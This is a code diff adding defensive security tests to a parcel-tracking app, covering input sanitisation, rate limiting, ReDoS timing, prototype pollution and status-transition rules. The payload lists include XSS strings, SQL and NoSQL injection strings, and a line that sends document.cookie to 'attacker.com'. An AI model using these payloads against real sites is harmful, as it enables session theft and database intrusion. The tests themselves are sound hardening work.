@@ -165,6 +165,267 @@ describe('Tier 5 Adversarial Stress & Anti-Fragility Testbench', () => {
       expect({}.bypass).toBeUndefined();
     });
   });
+
+  describe('Adversarial Tracking Service & Rate Limiter Security Pentest', () => {
+    it('resists XSS, SQL/NoSQL injection, oversized strings, and non-string types in tracking numbers', async () => {
+      const { fetchTrackingUpdates, resetTrackingCooldown } = await import('../services/trackingService');
+      resetTrackingCooldown();
+
+      const maliciousTrackingPayloads = [
+        '<script>alert("xss")</script>',
+        'javascript:fetch("//attacker.com/?cookie="+document.cookie)',
+        '<img src=x onerror="alert(1)">',
+        '\' OR \'1\'=\'1',
+        '\' UNION SELECT * FROM users --',
+        '{"$gt": ""}',
+        '{"$ne": null}',
+        'A'.repeat(25000),
+        'RS123456\u0000789IL',
+        'IL\u0000\u0008\u001F',
+        null,
+        undefined,
+        123456789,
+        true,
+        false,
+        {},
+        [],
+        () => 'malicious'
+      ];
+
+      for (const payload of maliciousTrackingPayloads) {
+        resetTrackingCooldown();
+        const res = await fetchTrackingUpdates(payload);
+        if (payload && typeof payload === 'string') {
+          expect(res).toBeDefined();
+          expect(typeof res.success).toBe('boolean');
+          expect(res.carrier).toBeDefined();
+          if (res.checkpoints) {
+            for (const cp of res.checkpoints) {
+              expect(cp.id).not.toContain('<script>');
+              expect(cp.id.length).toBeLessThanOrEqual(100);
+            }
+          }
+        } else {
+          // Non-string or falsy payloads must be safely rejected
+          expect(res.success).toBe(false);
+          expect(res.error).toBe('Invalid tracking number');
+        }
+      }
+    });
+
+    it('strictly enforces cooldown rate-limiting against rapid concurrent requests and bypass attempts', async () => {
+      const { fetchTrackingUpdates, checkRateLimit, resetTrackingCooldown } = await import('../services/trackingService');
+      const testTracking = 'RR987654321IL';
+      resetTrackingCooldown(testTracking);
+
+      // 1. Initial request succeeds
+      const firstRes = await fetchTrackingUpdates(testTracking, 'israel-post');
+      expect(firstRes.success).toBe(true);
+
+      // 2. Immediate second request is strictly rate-limited
+      const secondRes = await fetchTrackingUpdates(testTracking, 'israel-post');
+      expect(secondRes.success).toBe(false);
+      expect(secondRes.rateLimited).toBe(true);
+      expect(secondRes.remainingCooldownMs).toBeGreaterThan(0);
+      expect(secondRes.error).toContain('Please wait');
+
+      // 3. Direct checkRateLimit verification
+      const check = checkRateLimit(testTracking);
+      expect(check.isLimited).toBe(true);
+      expect(check.remainingMs).toBeGreaterThan(0);
+
+      // 4. Concurrent swarm (10 simultaneous calls for the same tracking number)
+      const concurrentResults = await Promise.all(
+        Array.from({ length: 10 }, () => fetchTrackingUpdates(testTracking, 'israel-post'))
+      );
+      // All 10 must be blocked by the active cooldown
+      for (const res of concurrentResults) {
+        expect(res.success).toBe(false);
+        expect(res.rateLimited).toBe(true);
+      }
+
+      // 5. Reset tracking allows immediate new fetch
+      resetTrackingCooldown(testTracking);
+      const afterReset = await fetchTrackingUpdates(testTracking, 'israel-post');
+      expect(afterReset.success).toBe(true);
+    });
+
+    it('bounds cooldown cache memory capacity to prevent memory exhaustion / DoS attacks', async () => {
+      const { recordTrackingFetch, checkRateLimit, resetTrackingCooldown } = await import('../services/trackingService');
+      resetTrackingCooldown();
+
+      // Bombard cache with 2,500 distinct tracking numbers
+      for (let i = 0; i < 2500; i++) {
+        recordTrackingFetch(`SPAM_TRACK_${i}_${'X'.repeat(50)}`);
+      }
+
+      // Latest recorded entries should be rate limited
+      const recentCheck = checkRateLimit('SPAM_TRACK_2499_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX');
+      expect(recentCheck.isLimited).toBe(true);
+
+      // Reset works completely
+      resetTrackingCooldown();
+      const checkAfterClear = checkRateLimit('SPAM_TRACK_2499_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX');
+      expect(checkAfterClear.isLimited).toBe(false);
+    });
+  });
+
+  describe('ReDoS & Regular Expression Catastrophic Backtracking Resilience', () => {
+    it('evaluates all carrier detection patterns against adversarial backtracking strings in < 50ms', async () => {
+      const { detectCarrier } = await import('./carrierDetector');
+      const { CARRIERS } = await import('../types/carriers');
+
+      const adversarialPatterns = [
+        '9'.repeat(100000),
+        'A'.repeat(50000) + '!',
+        '1Z' + 'A'.repeat(50000) + '!',
+        'YT' + '9'.repeat(50000) + 'X',
+        'LP' + '0'.repeat(50000) + 'CN!',
+        'HFD' + '9'.repeat(50000) + '!',
+        'BOX' + 'Z'.repeat(50000) + '!',
+        'CH' + '8'.repeat(50000) + 'X',
+        'RR' + '1'.repeat(50000) + 'IL!',
+        '4PX' + '3'.repeat(50000) + '!',
+        ' ' .repeat(50000) + 'RS948219481IL' + ' '.repeat(50000)
+      ];
+
+      for (const attackStr of adversarialPatterns) {
+        const t0 = performance.now();
+        const res = detectCarrier(attackStr);
+        const elapsed = performance.now() - t0;
+
+        expect(elapsed).toBeLessThan(50); // Hard bounded execution time under 50ms
+        expect(res).toBeDefined();
+        expect(typeof res.carrierId).toBe('string');
+      }
+
+      // Also audit raw patterns in CARRIERS
+      for (const carrier of Object.values(CARRIERS)) {
+        for (const regex of carrier.patterns) {
+          const t0 = performance.now();
+          regex.test('A'.repeat(10000) + '9'.repeat(10000) + 'IL');
+          const elapsed = performance.now() - t0;
+          expect(elapsed).toBeLessThan(50);
+        }
+      }
+    });
+
+    it('smart parser withstands nested punctuation and massive tokenized fuzzing strings', async () => {
+      const { parseSmartText, extractTrackingCandidates } = await import('./smartParser');
+
+      const pathologicalTexts = [
+        'Tracking: ' + '(((:::'.repeat(1000) + ' RS948219481IL ' + ')))!!!'.repeat(1000),
+        'מעקב משלוח: ' + '---===###'.repeat(1000) + ' 1Z999AA10123456784 ' + '***'.repeat(1000),
+        'word '.repeat(5000) + 'RS948219481IL',
+        '<!DOCTYPE html><html><body>' + '<a href="'.repeat(500) + 'RS948219481IL' + '"></a>'.repeat(500) + '</body></html>'
+      ];
+
+      for (const text of pathologicalTexts) {
+        const t0 = performance.now();
+        const parsed = parseSmartText(text);
+        const candidates = extractTrackingCandidates(text);
+        const elapsed = performance.now() - t0;
+
+        expect(elapsed).toBeLessThan(100);
+        expect(parsed).toBeDefined();
+        expect(Array.isArray(candidates)).toBe(true);
+      }
+    });
+  });
+
+  describe('Carrier Response Fuzzing & Checkpoint Schema Integrity', () => {
+    it('normalizes malformed, corrupted, and prototype-poisoned checkpoint arrays without crashing', async () => {
+      const { normalizeCheckpoints } = await import('../services/trackingService');
+      const { checkpointSchema } = await import('../schemas/packageSchema');
+
+      const corruptedCheckpoints = [
+        null,
+        undefined,
+        12345,
+        'string-checkpoint',
+        { id: null, title: undefined, timestamp: null },
+        { id: '<script>alert(1)</script>', title: '<img src=x onerror=evil()>', details: 'A'.repeat(5000) },
+        { __proto__: { admin: true }, constructor: { prototype: { hacked: true } } },
+        { id: 'cp-valid-1', title: 'Valid Step', timestamp: '2026-08-19T12:00:00.000Z', isCompleted: true },
+        Object.assign(Object.create(null), { id: 'cp-null-proto', title: 'Safe Checkpoint' })
+      ];
+
+      const normalized = normalizeCheckpoints(corruptedCheckpoints, '<script>trk</script>');
+      expect(Array.isArray(normalized)).toBe(true);
+      expect(normalized.length).toBe(corruptedCheckpoints.length);
+
+      // Verify each checkpoint matches Zod checkpointSchema or cleans safely
+      for (const cp of normalized) {
+        expect(typeof cp.id).toBe('string');
+        expect(typeof cp.title).toBe('string');
+        expect(typeof cp.timestamp).toBe('string');
+        expect(typeof cp.isCompleted).toBe('boolean');
+
+        const zodCheck = checkpointSchema.safeParse(cp);
+        expect(zodCheck.success).toBe(true);
+      }
+      expect({}.admin).toBeUndefined();
+      expect({}.hacked).toBeUndefined();
+    });
+
+    it('batchRefreshTracking safely tolerates arrays with corrupted, missing, or rate-limited packages', async () => {
+      const { batchRefreshTracking, resetTrackingCooldown } = await import('../services/trackingService');
+      resetTrackingCooldown();
+
+      const mixedPackages = [
+        { id: 'pkg-1', title: 'Valid Pkg', trackingNumber: 'RS948219481IL', carrier: 'israel-post', status: 'in_transit' },
+        { id: 'pkg-2', title: 'Delivered Pkg', trackingNumber: 'CH10849201', carrier: 'chita', status: 'delivered' }, // Should be skipped (delivered)
+        { id: 'pkg-3', title: 'Archived Pkg', trackingNumber: 'BOX920194', carrier: 'boxit', status: 'in_transit', isArchived: true }, // Should be skipped (archived)
+        { id: 'pkg-4', title: 'Missing Tracking', trackingNumber: '', carrier: 'other', status: 'in_transit' },
+        { id: 'pkg-5', title: 'Invalid Fields', trackingNumber: 'HFD90481029', carrier: 'hfd', status: 'in_transit', checkpoints: 'NOT_AN_ARRAY' },
+        { id: 'pkg-6', title: 'Corrupted', trackingNumber: 'YT2109849201948201', carrier: 'yunexpress', status: 'in_transit' }
+      ];
+
+      let progressReports = 0;
+      const res = await batchRefreshTracking(mixedPackages, () => {
+        progressReports++;
+      }, 2);
+
+      expect(res).toBeDefined();
+      expect(Array.isArray(res.updatedPackages)).toBe(true);
+      expect(res.updatedPackages.length).toBe(mixedPackages.length);
+      expect(res.refreshedCount).toBeGreaterThanOrEqual(1);
+      expect(progressReports).toBeGreaterThan(0);
+    });
+  });
+
+  describe('State Machine & Status Transition Integrity', () => {
+    it('strictly forbids invalid status transitions and tampering attempts', async () => {
+      const { deliveryService, canTransition } = await import('../services/deliveryService');
+
+      // Valid transitions
+      expect(canTransition('ordered', 'shipped')).toBe(true);
+      expect(canTransition('shipped', 'in_transit')).toBe(true);
+      expect(canTransition('in_transit', 'delivered')).toBe(true);
+      expect(canTransition('delivered', 'archived')).toBe(true);
+      expect(canTransition('ordered', 'ordered')).toBe(true);
+
+      // Illegal transitions
+      expect(canTransition('delivered', 'ordered')).toBe(false);
+      expect(canTransition('delivered', 'in_transit')).toBe(false);
+      expect(canTransition('delivered', 'shipped')).toBe(false);
+      expect(canTransition('delivered', 'customs')).toBe(false);
+      expect(canTransition('delivered', 'out_for_delivery')).toBe(false);
+      expect(canTransition('archived', null)).toBe(false);
+      expect(canTransition('__proto__', 'delivered')).toBe(false);
+      expect(canTransition('in_transit', '__proto__')).toBe(false);
+
+      // updatePackageStatus rejecting illegal transition
+      const packages = [
+        { id: 'pkg-del-1', title: 'Delivered Pkg', trackingNumber: 'RS123IL', carrier: 'israel-post', status: 'delivered' }
+      ];
+
+      const illegalUpdate = deliveryService.updatePackageStatus(packages, 'pkg-del-1', 'ordered');
+      expect(illegalUpdate.success).toBe(false);
+      expect(illegalUpdate.error).toContain('Cannot transition from delivered to ordered');
+    });
+  });
 });
+
 
 
